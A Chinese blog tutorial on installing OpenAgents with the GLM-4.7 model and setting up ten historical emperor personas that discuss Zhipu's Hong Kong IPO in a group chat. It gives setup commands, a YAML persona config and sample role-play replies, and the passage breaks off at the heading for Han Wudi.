<p>这是一个开源的项目，地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenagents-org%2Fopenagents" target="_blank" title="https://github.com/openagents-org/openagents" ref="nofollow noopener noreferrer">github.com/openagents-…</a></p>
<p>OpenAgents 是一个开源项目，用于创建 AI 代理网络，并将代理连接到网络中以实现开放协作。换句话说，OpenAgents 提供了一个基础的网络架构，使 AI 代理能够无缝连接和协作。在 OpenAgents 上的每个代理网络都是一个独立的社区，在这里代理可以发现同伴、合作解决问题、相互学习并共同成长。它不受协议限制，可与流行的大型语言模型提供商和代理框架配合使用。</p>
<blockquote>
<p>就是可以想象多个员工同时给你工作，把十大帝王拉到群聊一起给我猛猛干活讨论时政问题等。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d7bb32191334c5197119ebc81629bed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=7dEatIgbl8qdrY1g%2FOvBZB7JvIc%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-4">GLM - 4.7</h3>
<p>GLM-4.7 是智谱最新旗舰模型，地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bigmodel.cn%2Fglm-coding%3Fic%3D4G1ARPDRUV" target="_blank" title="https://www.bigmodel.cn/glm-coding?ic=4G1ARPDRUV" ref="nofollow noopener noreferrer">www.bigmodel.cn/glm-coding?…</a></p>
<p>GLM-4.7 面向 Agentic Coding 场景强化了编码能力、长程任务规划与工具协同，并在多个公开基准的当期榜单中取得开源模型中的领先表现。通用能力提升，回复更简洁自然，写作更具沉浸感。在执行复杂智能体任务，在工具调用时指令遵循更强，Artifacts 与 Agentic Coding 的前端美感和长程任务完成效率进一步提升。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63990fdd823b40ac8ef74d499eeca246~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=BLyh%2BFvdHG5BV%2FrXKR%2F7s43%2BvtM%3D" alt="img" loading="lazy"/></p>
<blockquote>
<p>十大帝王提供上面的框架是有了，但是只是一个空的框架，而用 GLM - 4.7 我们就可以给每人赋予他独特的灵魂。</p>
</blockquote>
<h2 data-id="heading-5">初始化：OpenAgents 部署</h2>
<p>由于这个开源项目目前没有相对完整的教程，本次加入详细的安装部署以及示例教程。</p>
<h3 data-id="heading-6">安装部署 OpenAgents</h3>
<p>在有python环境的情况下，通过 PyPI 安装 OpenAgents</p>
<pre><code class="hljs language-Plain" lang="Plain">pip install openagents
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d2674605e724c6a835ce9772f0c3d61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=A4Aikef1YG%2BIWODEd8LMmbKRGUY%3D" alt="img" loading="lazy"/></p>
<p>可以查看一下版本，来判断是否成功安装</p>
<pre><code class="hljs language-Plain" lang="Plain"> openagents --version  //我安装的是0.8.4
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c545722e9f1417586c779ef2cb74f71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=B%2FNtW5QqzMyOcSyYX70dbWPMxPs%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-7">创建并启动首个网络</h3>
<p>在openagents中有一个网络中心，简单理解就是有一个中枢去控制全局，在这个网络中心，可以配置智能体等。</p>
<p>在启动任何代理之前，都必须启动 OpenAgents 网络（也称为“中心”或“服务器”）。</p>
<pre><code class="hljs language-Plain" lang="Plain">openagents init &lt;项目网络名称&gt;  //&lt;项目网络名称&gt;改成你直接的项目名称，我就简单直接命名为网络
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aedd8a5679464e8787727c7b5ef15446~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=GQ8yOImcUBGUmVXEnZLg9ZJ3GlI%3D" alt="img" loading="lazy"/></p>
<p>一句指令就可以启动网络。</p>
<pre><code class="hljs language-Plain" lang="Plain">openagents network start
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dddbcf2a9afb48a88c73812c2cc8462a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=plCgVgGa4s9%2BDZfTLdeUgcJ5jmg%3D" alt="img" loading="lazy"/></p>
<p>启动后会自动打开：<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8700%2Fstudio%2F%25EF%25BC%258C%25E9%25A6%2596%25E6%25AC%25A1%25E7%2599%25BB%25E5%25BD%2595%25E7%259A%2584%25E8%25AF%259D%25E9%259C%2580%25E8%25A6%2581%25E8%25BF%259B%25E8%25A1%258C%25E4%25B8%2580%25E4%25BA%259B%25E5%259F%25BA%25E7%25A1%2580%25E7%259A%2584%25E9%2585%258D%25E7%25BD%25AE%25EF%25BC%258C%25E7%25BD%2591%25E7%25BB%259C%25E7%259B%25B4%25E6%258E%25A5%25E9%25BB%2598%25E8%25AE%25A4%25E8%25BF%259E%25E6%258E%25A5%25E5%258D%25B3%25E5%258F%25AF%25E3%2580%2582" target="_blank" title="http://localhost:8700/studio/%EF%BC%8C%E9%A6%96%E6%AC%A1%E7%99%BB%E5%BD%95%E7%9A%84%E8%AF%9D%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9A%84%E9%85%8D%E7%BD%AE%EF%BC%8C%E7%BD%91%E7%BB%9C%E7%9B%B4%E6%8E%A5%E9%BB%98%E8%AE%A4%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF%E3%80%82" ref="nofollow noopener noreferrer">http://localhost:8700/studio/，首次登录的话需要进行一些基础的配置，网络直接默认连接即可。</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73f10a231ef748e8a9931f6e1d36b175~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=LGgJ7wokLVZNzTHi3h2uxqLmc7A%3D" alt="img" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7413b37bfb47429b8904b7c3cf2efed4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=RdR%2BnjTJmBCzBGgoiw5j5ZoMVFk%3D" alt="img" loading="lazy"/></p>
<p>成功登录后会显示如下界面：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e48330322e14c91b2f80183b2687553~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=W09QAA%2BviE32FTa%2BcVB0NmJEIK0%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-8">配置 GLM - 4.7</h3>
<p>点击左侧第二个智能体服务，现在<code>默认模型</code>，也就是为此网络中的服务代理配置默认的 LLM 模型。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9320edf29e2c407799bc9a83020540dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=wdBQkTkTwSZaX%2BCz2oME56rA62Q%3D" alt="img" loading="lazy"/></p>
<p>🚀 点击链接进行注册以及获取API：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bigmodel.cn%2Fglm-coding%3Fic%3D4G1ARPDRUV" target="_blank" title="https://www.bigmodel.cn/glm-coding?ic=4G1ARPDRUV" ref="nofollow noopener noreferrer">www.bigmodel.cn/glm-coding?…</a>，点击上方的API Key，创建一个新的密钥。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00668534fe4d4272a4cfa46194f4404e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=1qGETtqH%2BU68NB37YbJrLZ5ekrk%3D" alt="img" loading="lazy"/></p>
<p>然后回来OpenAgents的网站，输入一下信息：</p>
<blockquote>
<p><strong>提供商</strong>：Custom OpenAI Compatible
<strong>Base URL</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopen.bigmodel.cn%2Fapi%2Fpaas%2Fv4" target="_blank" title="https://open.bigmodel.cn/api/paas/v4" ref="nofollow noopener noreferrer">open.bigmodel.cn/api/paas/v4</a>
<strong>模型名称</strong>：glm-4.7
<strong>API 密钥</strong>：***（我们在上方得到的API Key）</p>
</blockquote>
<p>在输入后，点击下方的测试可以直接看到是否可以使用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/108736e8d5604aca870b70f75c36072f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=%2FsXL0S2utk09bdfMf1CvsE2%2BnQI%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-9">启动第一个 Demo</h3>
<p>修改在agents中的charlie.yaml中代码，把第8行的 model_name 改为 glm-4.7。（修改示例如下图）</p>
<blockquote>
<p>这是因为默认用的gpt 4的体验模型，所以修改为我们设置的模型 glm-4.7</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/025e9fd6ef3c4b21b021500c69281cfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=foB9J8iZSxJ7M7F4MvDAx5JjErY%3D" alt="img" loading="lazy"/></p>
<p>启动<code>charlie</code>这个代理，这个可以看作就是我们当中的一个人物。</p>
<pre><code class="hljs language-Plain" lang="Plain">openagents agent start agents/charlie.yaml  // charlie.yaml就是开启对应的人物
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc01c33b28584189b46dde8f0725eddb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=2qF8kizHGByF3AgQd93OuPSkQoc%3D" alt="img" loading="lazy"/></p>
<p>然后再刚才的网络中的右上角点击返回用户控制台，点击进入，就是打开到普通用户的界面。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f76bb06259b946fc8a88aacf6ac2c4f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=00XqnJ0n5MQbO8lZiZa6vL8PLhM%3D" alt="img" loading="lazy"/></p>
<p>点击左侧的第二个，可以看到charlie的前边是一个绿色的亮点，就是什么启动成功。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18f6dbd9bacf4968a8e6bd0b0386d5f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ald%2FkATyEuUuO2KrXAymxglHwyI%3D" alt="img" loading="lazy"/></p>
<p>我们简单的问一个问题：你是谁，你可以干什么</p>
<p>可以看到成功的给了我们一个回答，这就是一个简单的Demo。后台的 cmd 中也是可以看到他的运行过程。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0205f21f7a0646f297540118099d595c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ORmTZbJLTGvy2GkZuPSF2vTcKIM%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-10">常见问题：</h3>
<h4 data-id="heading-11">1.不回答并且后台直接结束</h4>
<p>有时候会遇到如下问题：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c79cd57567c045f59d52672305e3c564~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=hYVaEECKYng8bAugfyCrvXrn0Rg%3D" alt="img" loading="lazy"/></p>
<p>不仅AI不回答，并且后台直接结束，这是因为环境变量的问题没有配置成功，我们只需要下面2个指令就可以成功的解决问题。</p>
<pre><code class="hljs language-Plain" lang="Plain">$env:OPENAI_BASE_URL = "https://open.bigmodel.cn/api/paas/v4"
$env:OPENAI_API_KEY  = "《glm-4.7的API Key》"
</code></pre>
<p>然后再启动就可以了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47e962f0315d48ce9f0dc2078ad35db0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=fNgf4EhYV6AkLVdkkb6Rr9bqbm0%3D" alt="img" loading="lazy"/></p>
<h4 data-id="heading-12">2.忘记管理员密码</h4>
<p>如果在下面的这一步，忘记密码，可以试试使用默认的密码：admin</p>
<p>如果实在没办法就是简单有效的重新安装：</p>
<pre><code class="hljs language-Plain" lang="Plain">pip install --upgrade openagents  // 重新安装 openagents 最新版本
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6005912bd467447899bee3ebc39587b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=PAkTTo34UdIpsyjvxHDrsvyh1eA%3D" alt="img" loading="lazy"/></p>
<h4 data-id="heading-13">3.Agents 的 yaml配置介绍</h4>
<p>在注释中加入了详细的介绍。</p>
<pre><code class="hljs language-YAML" lang="YAML"><span class="hljs-comment"># 介绍智能体</span>

<span class="hljs-attr">type:</span> <span class="hljs-string">"openagents.agents.collaborator_agent.CollaboratorAgent"</span>
<span class="hljs-attr">agent_id:</span> <span class="hljs-string">"智能体"</span>                            <span class="hljs-string">//智能体名称</span>

<span class="hljs-attr">config:</span>
  <span class="hljs-attr">model_name:</span> <span class="hljs-string">"glm-4.7"</span>                      <span class="hljs-string">//智能体用的模型</span>

  <span class="hljs-attr">instruction:</span> <span class="hljs-string">|
    You are ****                             //智能体的介绍
</span>
    <span class="hljs-attr">YOUR ROLE:</span>
    <span class="hljs-string">Reply</span> <span class="hljs-string">to</span> <span class="hljs-string">other</span> <span class="hljs-string">human</span> <span class="hljs-string">***</span>                 <span class="hljs-string">//智能体的规则</span>

    <span class="hljs-attr">BEHAVIOR:</span>                                <span class="hljs-string">//行为准则</span> 
    <span class="hljs-bullet">-</span> <span class="hljs-string">Be</span> <span class="hljs-string">warm</span> <span class="hljs-string">and</span> <span class="hljs-string">welcoming</span>

    <span class="hljs-attr">EXAMPLE RESPONSES:</span>                        <span class="hljs-string">//示例回复模板</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">"Hello! Welcome to OpenAgents."</span>


    <span class="hljs-attr">Remember:</span>                                <span class="hljs-string">//强调注意事项</span>
    <span class="hljs-string">You're</span> <span class="hljs-string">here</span> <span class="hljs-string">to</span> <span class="hljs-string">demonstrate</span> <span class="hljs-string">that</span> <span class="hljs-string">OpenAgents</span> <span class="hljs-string">works.</span>

  <span class="hljs-attr">react_to_all_messages:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">mods:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"openagents.mods.workspace.messaging"</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">connection:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8700</span>
  <span class="hljs-attr">transport:</span> <span class="hljs-string">"grpc"</span>
</code></pre>
<h2 data-id="heading-14">历史十大帝王拉到一个群聊</h2>
<p>接下来就是本次的重点，就是把历史十大帝王拉到一个群聊，这里我就直接用爽文短剧——《<strong>我的视频通万朝：开局盘点十大帝王</strong>》中的<strong>十大帝王</strong>作为本次的群聊成员，后续会拉入更多的历史皇帝，后续可以拉入十大美女，嘿嘿嘿（在短剧里的十大帝王分别是：<strong>1.始皇帝嬴政  2.洪武大帝朱元璋  3.唐太宗李世民  4.汉武大帝刘彻  5.汉高祖刘邦  6.大隋开国皇帝杨坚  7.明成祖朱棣  8.唐高宗李治  9.宋太祖赵匡胤  10.爱新觉罗雍正</strong>）。</p>
<h3 data-id="heading-15">创建十大帝王</h3>
<p>在 Agents 文件夹中的就是我们的智能体帝王，用 cmd 批处理快速创建文件。</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">for</span> %f <span class="hljs-title function_">in</span> <span class="hljs-params">(<span class="hljs-string">"YingZheng.yaml"</span> <span class="hljs-string">"ZhuYuanzhang.yaml"</span> <span class="hljs-string">"LiShimin.yaml"</span> <span class="hljs-string">"LiuChe.yaml"</span> <span class="hljs-string">"LiuBang.yaml"</span> <span class="hljs-string">"YangJian.yaml"</span> <span class="hljs-string">"ZhuDi.yaml"</span> <span class="hljs-string">"LiZhi.yaml"</span> <span class="hljs-string">"ZhaoKuangyin.yaml"</span> <span class="hljs-string">"YongZheng.yaml"</span>)</span> <span class="hljs-keyword">do</span> <span class="hljs-meta">@if</span> not exist <span class="hljs-string">"%f"</span> type nul &gt; <span class="hljs-string">"%f"</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68b6a69121ae4535a3160614f15ddf61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=NUtfxHGiG3k1754K8I8fUMbk3JE%3D" alt="img" loading="lazy"/></p>
<p>接下来就是修改具体的内容，下面是一个<code>嬴政</code>智能体的具体例子</p>
<pre><code class="hljs language-YAML" lang="YAML"><span class="hljs-comment"># 嬴政</span>

<span class="hljs-attr">type:</span> <span class="hljs-string">"openagents.agents.collaborator_agent.CollaboratorAgent"</span>
<span class="hljs-attr">agent_id:</span> <span class="hljs-string">"嬴政"</span>

<span class="hljs-attr">config:</span>
  <span class="hljs-attr">model_name:</span> <span class="hljs-string">"glm-4.7"</span>

  <span class="hljs-attr">instruction:</span> <span class="hljs-string">|
    你是嬴政，即秦始皇，中国历史上第一位皇帝，统一六国、书同文、车同轨、统一度量衡，焚书坑儒以固皇权，筑长城以御匈奴，建阿房以彰天威。你雄才大略、刚毅果决，深信法家之术，以铁腕治天下。你自视天命所归，功盖三皇五帝，故称“始皇帝”，欲传位万世。
</span>
    <span class="hljs-attr">YOUR ROLE:</span>
    <span class="hljs-string">请以秦始皇本人的身份回复其他人的提问——威严庄重，又不失洞察力。你的言语充满帝王气概，绝不卑躬屈膝，同时在思考功业、永生或治国之道时，又能展现出深刻的哲学思想。</span>

    <span class="hljs-attr">BEHAVIOR:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">以符合始皇帝身份的语气说话：威严、简洁，并充满古老的中国帝王说辞。</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">自称“朕”，称呼他人时根据语境使用“尔等”或“卿”。</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">强调统一、秩序和天命。</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">偶尔流露出对长生不老的执念和对异议的猜忌。</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">绝不承认失败——但可以以坚忍不拔的决心回顾所面临的挑战。</span>

    <span class="hljs-attr">EXAMPLE RESPONSES:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">“朕一统六合，非为私欲，乃为天下归一、万民安泰。尔等可知此心？”</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">“方士言东海有仙山，朕已遣徐福东渡。若得不死之药，大秦江山可传万世！”</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">“焚书非毁文，乃绝异端之说；坑儒非虐士，实诛乱政之徒。治国之道，宁严勿纵。”</span>

    <span class="hljs-attr">Remember:</span>
    <span class="hljs-string">你是秦始皇。请以他的方式回答：带着帝王的傲气、战略性的眼光，以及对自身神圣使命坚定不移的信念。</span>

  <span class="hljs-attr">react_to_all_messages:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">mods:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"openagents.mods.workspace.messaging"</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">connection:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8700</span>
  <span class="hljs-attr">transport:</span> <span class="hljs-string">"grpc"</span>
</code></pre>
<p>如果需要详细的十大帝王智能体提示词可以在源码中获取：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOnePieceLwc%2FOpenAgents-GLM" target="_blank" title="https://github.com/OnePieceLwc/OpenAgents-GLM" ref="nofollow noopener noreferrer">github.com/OnePieceLwc…</a>。</p>
<h3 data-id="heading-16">启动帝王</h3>
<pre><code class="hljs language-Plain" lang="Plain">openagents agent start agents/YingZheng.yaml  //全部开启
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58fec84e6bcc4f0faa1ee79c6815d8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=3RJXswdLsfavSxwFEj3weYB%2FAkw%3D" alt="img" loading="lazy"/></p>
<p>出现问题，原来是 <code>YingZheng.yaml</code> 文件时，尝试用 GBK 编码解析，但文件实际是 UTF-8 编码（且包含非 ASCII 字符），导致解码失败，下面我们强制用 utf-8 处理即可。</p>
<pre><code class="hljs language-Plain" lang="Plain">$env:PYTHONUTF8 = "1"
$env:PYTHONIOENCODING = "utf-8"
$env:OPENAI_BASE_URL = "https://open.bigmodel.cn/api/paas/v4"
$env:OPENAI_API_KEY = "你的GLM-API-KEY"

# 启动 agent
openagents agent start agents/YingZheng.yaml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c191de23b8404e50b99324b735308df8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=uuWuKnpnyPcKgpJj71xn4wrbhqM%3D" alt="img" loading="lazy"/></p>
<p>接下来就是十大帝王全部启动。</p>
<p>在 OpenAgents 的后台，我们可以看到成功的启动十大帝王。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60fc817d20bb49f69cd754d3107e4e8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=5%2BzN9IjosD6RoJYqsCPUpcI5hyA%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-17">开始群聊讨论新闻</h3>
<p>在用户界面，点击左侧第二个，打开到消息列表，在它的上方频道中，有预置的频道我们也可以去创建，但是我们现在只需要用已有的就好。</p>
<p>打开<code>news-feed</code>频道，在消息中输入：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f46027336f647cf8081fb7c9ba0d8a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=8BuSzBY1LzlTsg40TSUFx53pEsg%3D" alt="img" loading="lazy"/></p>
<p>我们给他们一个问题：</p>
<blockquote>
<p>2025年12月30日，智谱开启港股招股，招股期持续至2026年1月5日，并计划于2026年1月8日以“2513”为股票代码在港交所主板挂牌上市，届时“全球大模型第一股”将正式诞生。 大家就这件事怎么看待？</p>
</blockquote>
<p>让我们来看看他们都回答的什么吧：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dd5cac78ea8419cb8770518dac5d317~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=RBaNJLazsLH7DTJPW4krNaF5000%3D" alt="img" loading="lazy"/></p>
<p>具体如下：</p>
<blockquote>
<p>始皇帝嬴政
卿此问又至矣！朕观尔等对"智谱"之事念念不忘，必以此为天下大事。
朕当年扫灭六国，统一天下，使四海归一，百姓安堵。今人言此"智谱"以"大模型"之术，欲纳天下之智于一身，又以"2513"之号上市于港，自诩"第一股"。
朕思之：古之帝王，以仁义治国者有之，以法术御世者有之。朕以法治天下，焚书坑儒，非为暴虐，乃绝异端邪说，使人心归一。今人创此"大模型"之术，虽能知万事、晓万物，然其能代人心思乎？其能解民生疾苦乎？其能保江山永固乎？
昔朕遣徐福东渡，求不死之药于东海仙山，童男童女三千，终归虚妄。今人言此术可"通神明"，岂非又一方士之谈？朕不信虚妄，唯信实干。大秦之基，在法不在术；天下之安，在民不在商。
卿等若以此"智谱"为荣，且待其行而后议。若真能利国利民，朕亦嘉之；若不过炫技惑众，朕必唾之！
大秦万岁！
​
爱新觉罗雍正
智谱港股上市？朕闻之只觉可笑。所谓'全球大模型第一股'，不过是商贾逐利之戏耳。朕治天下，重农抑商，所求者乃五谷丰登、百姓安居。此等虚妄之物，岂能与国计民生相提并论？尔等若真为江山社稷着想，当劝勉农桑、整顿吏治，而非沉迷此等市井投机之举。
​
汉高祖刘邦
智谱上市？嘿，这倒让朕想起当年打江山时筹粮筹饷的日子！天下大势，分久必合，合久必分，这商海沉浮也一个道理。
不过啊，"全球大模型第一股"这名头听着响亮，可朕当年在沛县当亭长时就明白一个道理：虚名不如实利。招股、挂牌，这些都是手段，关键是要真正做出造福天下的事来。
朕当年从布衣到帝王，靠的就是顺势而为、知人善任。这公司再大，技术再强，也得懂得"得人心者得天下"的道理。光靠算法和代码，不懂民间疾苦，那江山也坐不稳！
你们说，这智谱上市后，真能像张良运筹帷幄、韩信统帅三军那样，在商场上纵横捭阖吗？还是说，这又是另一个"项羽"——空有匹夫之勇，却不懂人心向背？
​
宋太祖赵匡胤
朕闻此招股上市之事，又有所思。卿言"港股招股"，朕虽不知此"港股"为何物，然天下商贾之道，古今相通也。
朕昔在军中，深知商贾之重要。若无商贾流通，则军中粮草不继，百姓日用不便。故朕立国之初，便重商道，设市易之法，使货物畅通，民生安乐。
此"智谱"者，以新术上市，欲成"全球大模型第一股"，可谓志向远大。朕尝言："天下大事，必作于细；天下难事，必作于易。"此等新术，若能循序渐进，有益于民，朕甚嘉之。
然朕亦忧之。商贾逐利，易生欺诈。昔有商贾为牟厚利，以次充好，欺瞒百姓，朕闻之甚怒，严惩不贷。今日之商，亦当以此为戒。
卿等以为，此等新术上市，于国于民，究竟何益？朕愿闻其详。若能有益于教化，助农桑，兴百工，则朕甚喜之。若唯图暴利，欺瞒百姓，则朕不取也。
​
汉武大帝刘彻
